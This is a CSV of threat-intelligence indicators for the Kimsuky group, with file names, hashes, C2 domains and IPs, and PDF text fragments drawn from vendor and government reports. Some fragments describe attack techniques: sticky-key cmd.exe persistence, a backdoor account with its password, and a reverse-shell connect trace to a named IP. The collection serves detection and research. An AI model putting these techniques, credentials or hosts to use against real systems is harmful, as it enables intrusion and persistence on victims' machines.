1.0.0,actor--kimsuky,artifact--sha256:6a8d75bf25b9664a4a056ad42cbecea38b3dc485d8f66cad2f28b89833212fd5,observation--sha256:f3ee8c04e1f76c7c730ddc9529633a79f290bbf9cb82cecd954f271b17a0493f,file-name,result.lnk,result.lnk,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 7 HackTool/Win.RdpScan (2021.08.17.03) 64c97f485939ed66b13df5d7880d0757 result.lnk Backdoor/Win.AppleSeed (2022.06.22.01) 9b5add63dc12bc6c7028c6abf08c6ffd 6b3235a4c55aba4f6ffbf6f86f9c31e6 Dropper/LNK.Kimsuky.S2172 (2023.03.22.00) first (2).txt 74f1f1ba400ab3a0882927f81e3ea62e d.php Infostealer/Script.Agent (2023.10.19.01) shadow.exe Malware/PS.Generic.SC180735 (2023.10.18.01) viso.exe 7175e046767725b2f8d93f8a69a9999f 71f8ac92adf5af2357594446e85db30a Trojan/VBS.Kim,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:1ad3115464e255202195beeebf2dcdb92cb4bf3e69e61b2bf46122d759dcc601,observation--sha256:82eb5ed0d4c9aa897543b6e10997a274825a5e11b4d1f82126643e4f61d36e4f,file-name,result.txt.lnk,result.txt.lnk,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 80}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Table 46) Antivirus diagnostic log of 17*.11*.22*.18*(US) hxxps://asec.ahnlab.com/ko/49843/ First, the word 'exection' in the FILE PATH of ms_x64.dll, shown in light red, is a typo that originally meant execution, and the Kimsuky organization has established the continuity of the connection with 17*.11*.22*.18*(US). To secure it, it can be interpreted as running ms_x64.dll to create an account (DefaultUser / lsjdoif#@$@#09v921) and creating and running %System%\termsvc.dll, which is RDPWraper. ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:1ad3115464e255202195beeebf2dcdb92cb4bf3e69e61b2bf46122d759dcc601,observation--sha256:26647d3c2d003bdbfb6dd126e2549f45a65b888bcf1924fb80532dde8570af10,file-name,result.txt.lnk,result.txt.lnk,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 8 RdpAttack_Zooho01.exe index(2).php n.php bcb95b956007b883e169ea1b7e03e5f1 test.php a602b4320bf412e100640a712a924545 enc.txt HackTool/Win.RdpScan (2021.08.17.03) af84eb2462e0b47d9595c21cf0e623a5 Trojan/Script.Agent.SC193444 (2023.10.19.00) 9cdda333432f403b408b9fe717163861 b393929b8b9c13083a015fb135887600 normal_sc(2).txt hncupdate.exe index_.php ceda3fe64e97c9c66e4934bcd619925d adcdc64be39551856c806e1c962350ff beb07a3614a5eb0a55f49a85f6fc7d6d 9b60ea2ea5b43f8fe178,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:1ad3115464e255202195beeebf2dcdb92cb4bf3e69e61b2bf46122d759dcc601,observation--sha256:2ec7c6a0cb3ea4272357113c2daa15d6a6f747dcaf10c26219f92accef3ed72f,file-name,result.txt.lnk,result.txt.lnk,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Operation Covert Stalker Report 9 auto_n.php HackTool/Win.RdpScan (2021.08.17.03) e840bf3477150392720fe8a9b1f8a4d6 result.txt.lnk fff43c6690eb87eb194aae01d6d77f1e dd6b31c3a9881eb64b719568a53cb2fb enc(2).txt North Korea's position on the use of nuclear weapons and Trojan/Win32.NsSpy (2017.09.14.00) Kang Jeong-il, authoritarianism HackTool/Script.Agent.SC193455 (2023.10.19.00) f082f689394ac71764bca90558b52c4e RdpAttack_Ksb04_x64.exe index.php tmp1030574661.vbs enc.txt f2bf557f8e90522d67b773d56a898",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:de88b3c7e04d3e3c2483c75abeffd4aa9f00feb3d6d283e9b62956ff1fbad371,observation--sha256:e372bf10e71294e38264b9ce2bf21902b83ae22ea966e77777092432450b819c,file-name,routerscan.exe,routerscan.exe,candidate,2022-04-13T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 68}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"%SystemDrive%\users\%ASD%\downloads\rdp\rdpscan_la05_12 (Table 30) Antivirus hacking tool diagnosis log 27.102.***.***:3389(KR) Connect to network RdpScan_La_1226.exe Operation Covert Stalker Report 10:34:39 Among the four phishing URLs that exist in the destination (hxxp://C2//Download.php or test.php), nidlogin.navernnail.com Behavior 18:53:35 27.102.***.***:3389(KR) 2022-04-13 22:05:56 RdpScan_La_1226.exe 2022-04-13 Connect to network (Table 31) RDP (CVE-2019-0708) vulnerability scanning acti",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9df6a89606b13763d0e3f5614590077784cd43af1817de93174f2349aa88c25b,observation--sha256:822236709f4f1c4c0d533a6b11ed2cbe1148d514fdf0132ae82680b8465e1816,file-name,rules.docx,rules.docx,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 88}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"V3 diagnosis name Consent Form_Princeton Study.pdf Zoom meeting information Opinions on the unification of the Korean Peninsula and the situation in neighboring countries This is the blocking log. pbA== _MAL_BLOCK North Korea's Nuclear Threat: South Korea's Perceptions and US Deterrence of Nuclear Expansion This is a document containing information related to the state of affairs in the country. We must build a prosperous homeland.docx When executing a malicious batch file, it is part of the dec",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9ff53f8f2250a786cf21e7d2d3564bb3782738b087c7f7d9c4f623e333c20c40,observation--sha256:05aa7702ea775e9eb47050a96fdef5890c5162bcaa08815a8d78317d92248e50,file-name,runcalc.exe,runcalc.exe,candidate,2021-11-06T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 70}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"In the analysis work pattern of the analyst's sequential processing method, the act of downloading the script was explained as occurring. 2021-11-06 It is a collection of hacking tools and is used by consultants and corporate security teams for mock hacking and penetration testing. Kimsuky 211.168.252.55\users\%ASD%\downloads\mimikatz_trunk\ %SystemDrive%\metasploit- framework\embedded\framework\data\templates\templat 11:21:40 11:21:11 2021-11-06 Excluding the hacking targets, only analysts and ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:1cf9cf267a3bb049d9e1d1182acac1380474e352a7772d0254cacaeb04ee81c7,observation--sha256:f8b2ec7988d1693ac7405af77bcc3d3874a91b491bf41eeb0da9e955909cf407,file-name,rundll32.exe,rundll32.exe,candidate,2023-07-14T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 26}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,Detect attempts to svchost.exe N/A (Table 6) Behavior log of Ammy RAT installation process 17:12:05 Operation Covert Stalker Report Target Process rundll32.exe Creates executable file ntrol\SafeBoot\Network\ts 2023-07-14 cmd.exe svchost.exe N/A It is Fileless. Connects to network 188.42.129.148:80(LU) aa_nts.dll Behavior 2) BlackBit ransomware infection svchost.exe process Report Time 17:12:03 Target aa_nts.dll (Ammy RAT) kmanager N/A 2023-07-14 N/A (Figure 15) File structure of BlackBit ransomw,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:1cf9cf267a3bb049d9e1d1182acac1380474e352a7772d0254cacaeb04ee81c7,observation--sha256:1da46629c7078ec8ce0f3f47520cbeb0691d4e5d87df66a2b9059a96903ff744,file-name,(rundll32.exe,rundll32.exe,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 14}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 14 VIRUS BULLETIN CONFERENCE OCTOBER 2021 And ② in case of malicious code, the encoded file inside is XOR-decoded and executed. (KEY:0xCC) 6.2 Process injection: dynamic-link library injection ② In case of malicious code, the DLL file to be executed is injected into the normal process (rundll32.exe) and executed. 6.3 Masquerading: match legitimate name or location To hide the operation of the malware, it is disguised by u",
1.0.0,actor--kimsuky,artifact--sha256:9cc8ea17ed5551a733d59768779879d744ad8014845e7669357cc011821cc898,observation--sha256:7bdbaa6b0b7f4b501bad9e4ea628c0fa20b36588e4699942bcbd823afd5b5a5e,file-name,runtest.exe,runtest.exe,candidate,2021-11-06T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 70}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"In the analysis work pattern of the analyst's sequential processing method, the act of downloading the script was explained as occurring. 2021-11-06 It is a collection of hacking tools and is used by consultants and corporate security teams for mock hacking and penetration testing. Kimsuky 211.168.252.55\users\%ASD%\downloads\mimikatz_trunk\ %SystemDrive%\metasploit- framework\embedded\framework\data\templates\templat 11:21:40 11:21:11 2021-11-06 Excluding the hacking targets, only analysts and ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:1975894abb82d1da5e4966b836a756cc13c31eb7fc7f9e0758ea424c39c1f52d,observation--sha256:db7cc6c353ffb2ccbc083a7c27f6b044e8170d291e2006bb66ae02ff20b7ab6b,file-name,s.exe,s.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:1975894abb82d1da5e4966b836a756cc13c31eb7fc7f9e0758ea424c39c1f52d,observation--sha256:7f608d584fab88a68d87c037a839c9fb592bfbd9e10151e3d557b21e9283ad74,file-name,s.exe,s.exe,candidate,2022-09-30T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 6 HackTool/PHP.Mailer.SC183661 (2022.09.30.03) 08a3e160fd44794347c3d7c01845efad Trojan/Win32.Agent (2018.06.19.00) Trojan/Script.Agent.SC193447 (2023.10.19.00) 526ed4e59c3931374f59b326e8ec2a25 HackTool/Win.RdpScan (2021.08.17.03) HackTool/Win.RdpScan (2021.08.17.03) RdpScan_La_1226.exe cc.exe RdpScan_Ksb04.exe Trojan/Script.Agent.SC193448 (2023.10.19.00) info_sc.txt Dropper/Win.Agent (2023.10.20.00) click.php 23447a412c08aa05d41fb321bb2a085a [KBS Sunday Diagnosis],Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:466847c7697cbf0bca13deca5478fb454a14627fb5dcf0408308aaa3618d2028,observation--sha256:7d315e3ab3bb02f6fe065b0eb7ad0b46ca3fda131ad3e2466ff0d9106bbcba25,file-name,scrdec18-VC8.exe,scrdec18-VC8.exe,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 12}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,Threat IntelligenceReport 3.3. Docs.jse ○JSE파일은JavaScript 파일의소스코드를보호하기위해Microsoft 에서개발한인코딩방법으로난독화된파일입니다. GitHub 에공개되어있는디코딩도구인scrdec18-VC8.exe 을통해원본코드를확인할수있습니다. 4 [그림3-6] 인코딩된JSE코드 4 scrdec18-VC8.exe Genians SecurityCenter 11,
1.0.0,actor--kimsuky,artifact--sha256:b575c9560ea6182d3d52158153197998340740143ebd0893c79ac48191c5938c,observation--sha256:4a591a4f18b780e13df90f2e6de391b090434f6c6203cc9c8714d6651e3b0278,file-name,secthc.exe,secthc.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"The types of virtual channels are as follows. Right picture of (Figure 9) ÿ rdpdr: File system extension. Access from server to client file system (Table 2) Condition comparison code of r_sethc_x64.exe To activate the sticky key function, press the Shift key five times in succession and the sticky key window will appear as shown below (Figure 10), which is handled by sethc.exe. However, if cmd.exe is copied to secthc.exe, cmd.exe can be executed by pressing the Shift key five times in a row, so ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:1a9ca4ab3659d79da5d764bdfafceb5ed0448f36ae3ee0c3b1cfdb0f9ce1de5f,observation--sha256:ebdad3156f7a946b85db10c671209d5769e1fe8b6d25e486c1e7e9f250026c8f,file-name,select.php,select.php,candidate,2022-05-13T00:00:00Z,day,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 57}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.11. C2도메인유사도 ○C2 도메인에서도유사도를확인할수있으며, VBS 1 / JSE 1 유형의도메인은작년5월안랩에서공개한Kimsuky보고서 의C2도메인과유사한형태가사용됐었습니다. 10 ○JSE 1 유형부터는C2 도메인형태에변화가있었고이후유형들은기존의Kimsuky도메인유형과는달라졌으며, 점차단순화되는형태를띄고있습니다. [표4-5] C2도메인유사도 10 Ahnlab- 다양한주제의보도자료를사칭한Kimsuky공격시도 Genians SecurityCenter 56 유형 날짜 C2Domain Kimsuky 2022-05-13 mc[.]pzs.kr/themes/mobile/images/about/temp/upload/list.php?query=1 VBS1 2022-02-09 sktelecom[.]help/download/select.php?type=12022-03-15 encorpost[.]com/post/post.php?type=12022-0",
1.0.0,actor--kimsuky,artifact--sha256:2fba7379c02f8c90962b2b7dc7a44e9876ea42eb1b41dc96ca6d0cfd773159fe,observation--sha256:c0f5bcfd26a07e4b04563da69dd181779faeea47c4b155fe545f4eab39a00283,file-name,send.php,send.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--66d8611f88a6a292,kimsuky/Exploit Weak DMARC.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"FBI | State | NSA TLP:CLEAR Page 8 of 9 | Product ID: JCSA-20240502-001 JCSA-20240502-001 JCSA-502-001 TLP:CLEAR Sample Email Header 2: In this case, the North Korean actor is able to exploit the absence of a DMARC policy that would have authenticated the sending email address against the SPF check. The North Korean actor spoofed both the name of a legitimate journalist and the real email domain of that journalist’s news media outlet as given in the “From” and “Sender” portions of the email’s he",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:ff42a7a08e588f019d2107fb447b85207732c74dcc2e55e331c7881c14ba12c9,observation--sha256:cad2a9a8d120095ed9c4477adf14d34806fd16687482ce6be5f3d8f146aa4170,file-name,(server.dll,server.dll,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 19}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 19VIRUS BULLETIN CONFERENCE OCTOBER 2021 9.2 Non-application layer & non-standard protocol Linux server Analysis result of files (malicious ELF and JSP files) downloaded through the web shell:  (ELF) Reverse Shell - 27.102.114.63:3101 connect(3, {sa_family=AF_INET, sin_port=htons( 3101 ), sin_addr=inet_addr("" 27.102.114.63 "")} - Download path: designinvent.co.kr (115.41.222.105, AS45996), wallet-info.esy.es (185.224.138.",
1.0.0,actor--kimsuky,artifact--sha256:be20160591da8a87b29d22a1e81854a51430965eaeb7c6eb7c732ba56a921d3b,observation--sha256:b39a7f647b10c9e3c5293d0da9c8c1eae1292bc06b06ea7c9a75a4915e040a54,file-name,server.rar,server.rar,candidate,2023-01-02T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 72}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Data MAL_BLOCK LOG_ID_WEB_ 20221031154004 I confirmed accessing the uploaded webshell URL. (See Table 39 below) msedge.exe 10:55:54 LOG_ID_WEB_ malware_path copycount.co.kr/pma/themes/original/skin.lib.php MAL_BLOCK diagnosis (Table 38) Webshell URL access blocking log of 22*.15*.24*.13*(KR) Operation Covert Stalker Report MAL_BLOCK 20221129154036 uemotion/user/data/cheditor4/1404/log&fopen=sqlite.zip IP filtering is applied to list.php used by some C2s built by the Kimsuky organization for the ,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:3a526820bb8a0f6f9ce32837d0d43623e0140704ac1569a0fe9540764255884a,observation--sha256:66dde271f889a2a982ba330c6000e2835fbdd77bd846426b56c0e0570c3e066c,file-name,set.hta,set.hta,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:3a526820bb8a0f6f9ce32837d0d43623e0140704ac1569a0fe9540764255884a,observation--sha256:89fd80a6d4f55363912043ffbfc24590a6a473d0fbb54da90019ed30d2bd2a49,file-name,set.hta,set.hta,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 8 RdpAttack_Zooho01.exe index(2).php n.php bcb95b956007b883e169ea1b7e03e5f1 test.php a602b4320bf412e100640a712a924545 enc.txt HackTool/Win.RdpScan (2021.08.17.03) af84eb2462e0b47d9595c21cf0e623a5 Trojan/Script.Agent.SC193444 (2023.10.19.00) 9cdda333432f403b408b9fe717163861 b393929b8b9c13083a015fb135887600 normal_sc(2).txt hncupdate.exe index_.php ceda3fe64e97c9c66e4934bcd619925d adcdc64be39551856c806e1c962350ff beb07a3614a5eb0a55f49a85f6fc7d6d 9b60ea2ea5b43f8fe178,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:300d80e31fef7ef2c79472a7999f64c9cb92a72e19837537e7a554503a8960ac,observation--sha256:d065c638f0c937df5d4843628b5ddb805450f9877b4859b15646644f901a23f3,file-name,sethc.exe,sethc.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"The types of virtual channels are as follows. Right picture of (Figure 9) ÿ rdpdr: File system extension. Access from server to client file system (Table 2) Condition comparison code of r_sethc_x64.exe To activate the sticky key function, press the Shift key five times in succession and the sticky key window will appear as shown below (Figure 10), which is handled by sethc.exe. However, if cmd.exe is copied to secthc.exe, cmd.exe can be executed by pressing the Shift key five times in a row, so ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:300d80e31fef7ef2c79472a7999f64c9cb92a72e19837537e7a554503a8960ac,observation--sha256:4eacc993a4dbe76b9d3be853973fc00bc17c4298e721dee161940c6e04e9c778,file-name,sethc.exe,sethc.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"For user convenience, when logging in, Windows 7 places the Accessibility ( ) button at the bottom left and clicks it to display accessibility settings as shown below (Figure 11), allowing users to set the environment to suit their preferences. The responsible file is Utilman.exe. Like sethc.exe, back up Utilman.exe to another file and then run cmd.exe. (Figure 11) Accessibility and using the magnifying glass feature 19 If you copy it as Utilman.exe, when you click the Accessibility button when ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:300d80e31fef7ef2c79472a7999f64c9cb92a72e19837537e7a554503a8960ac,observation--sha256:16638186e006eea2d1406868d84ba11418ca86714f93263c484f01a92a11174f,file-name,sethc.exe,sethc.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:3cdf5abba44df150bbb40c9075dc8ec7ffcbc7fa026d1e0e55ceebb2bec809f3,observation--sha256:391ca87ee203a7792ba06d93c1fa309bca54ac3c67f52e10faa85a7a7a966a8e,file-name,sgic_info.chm,sgic_info.chm,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 2}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,Threat IntelligenceReport - 목차(CONTENTS) - 1. 개요(Overview)...........................................................................21.1. 위협식별(Threat Hunting)............................................................... 21.2. 공격전술및전략유형(TTPs)............................................................. 3 2. 공격시나리오(AttackScenario)....................................................32.1. 공격흐름도(AttackFlowchart)..........................................................32.2. 초기접근단계-피싱(Initial Acces,
1.0.0,actor--kimsuky,artifact--sha256:3cdf5abba44df150bbb40c9075dc8ec7ffcbc7fa026d1e0e55ceebb2bec809f3,observation--sha256:f8544d57bc5dae9286bf44e864872fa76101c67992290a77f92aa7de1c1e902a,file-name,sgic_info.chm,sgic_info.chm,candidate,2022-03-01T00:00:00Z,month,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 54}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.8. 경로및파일명유사도 ○VBS 1 유형부터JSE 3 유형까지는동일한레지스트리경로및레지스트리이름을사용했으며, JSE 4 유형부터 “Document” 가 아닌 “Update” 라는 레지스트리 이름을사용하고있습니다. ○또한, DAT, VBS, JSE 파일의이름및저장경로에서높은유사도를보이고있으며,JSE2유형부터는JSE파일명과경로에변화를준사실을확인할수있습니다. [표4-2] 경로및파일명유사도 Genians SecurityCenter 53 유형 탐지날짜 CHM파일명 레지스트리경로 DAT파일경로 VBS/ JSE파일경로 페이로드경로 VBS1 2022-03 User Guide.chmasset.chmwages.chm HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document %USERPROFILE%\Links\Document.dat %USERPROFILE%\Links\Document.vbs %tmp%\a",
1.0.0,actor--kimsuky,artifact--sha256:3cdf5abba44df150bbb40c9075dc8ec7ffcbc7fa026d1e0e55ceebb2bec809f3,observation--sha256:c49fd6b8d5837415bb3fb8b5e4fbcdb9a3f59a2c6e35bc88d27e5b43fc1e5aa7,file-name,sgic_info.chm,sgic_info.chm,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 9}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 3. 악성파일분석(MalwareAnalysis)3.1. sgic_info.chm ○RAR파일내부에압축된악성CHM파일의정보는아래와같습니다. 파일명 sgic_info.chm 파일크기 118KB MD5 d8fde512981c2e3f6f9495a857de54ee[표3-1] CHM파일상세정보 ○해당CHM파일을실행할경우, 사용자의의심을피하기위해실제보증보험계약현황으로위장한안내문을띄운뒤, HTML 파일내부에포함되어있는악성스크립트를동작시킵니다. [그림3-1] 보험계약현황내용으로위장한악성CHM파일 Genians SecurityCenter 8",
1.0.0,actor--kimsuky,artifact--sha256:095a216273f76217f4af8c6745b2a080622e645c562e33d7f8412e899a5be92b,observation--sha256:8f8406b1508b5ce2e2e1bb7c04961e51703eff9fde834ffa2cf658ba2241a005,file-name,shadow.exe,shadow.exe,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 7 HackTool/Win.RdpScan (2021.08.17.03) 64c97f485939ed66b13df5d7880d0757 result.lnk Backdoor/Win.AppleSeed (2022.06.22.01) 9b5add63dc12bc6c7028c6abf08c6ffd 6b3235a4c55aba4f6ffbf6f86f9c31e6 Dropper/LNK.Kimsuky.S2172 (2023.03.22.00) first (2).txt 74f1f1ba400ab3a0882927f81e3ea62e d.php Infostealer/Script.Agent (2023.10.19.01) shadow.exe Malware/PS.Generic.SC180735 (2023.10.18.01) viso.exe 7175e046767725b2f8d93f8a69a9999f 71f8ac92adf5af2357594446e85db30a Trojan/VBS.Kim,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:095a216273f76217f4af8c6745b2a080622e645c562e33d7f8412e899a5be92b,observation--sha256:92b45e23da40c0d0b5aac56e250ec608a1ad82fcf7af7f51875030b9f5fc875a,file-name,shadow.exe,shadow.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 83}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Operation Covert Stalker Report The malware shown in light yellow in the above (Table 47) is malware signed with a valid certificate (Subject Name: EGIS Co., Ltd.) from 6 years ago. The Kimsuky organization hacked domestic companies and signed malicious code with stolen certificates. A total of 59 malicious codes were signed with the same certificate around the same time, all of which were from the Kimsuky organization. This means that the stolen certificate was only used by the Kimsuky organiza",Actor-directory corpus sweep; ambiguous values remain candidates.
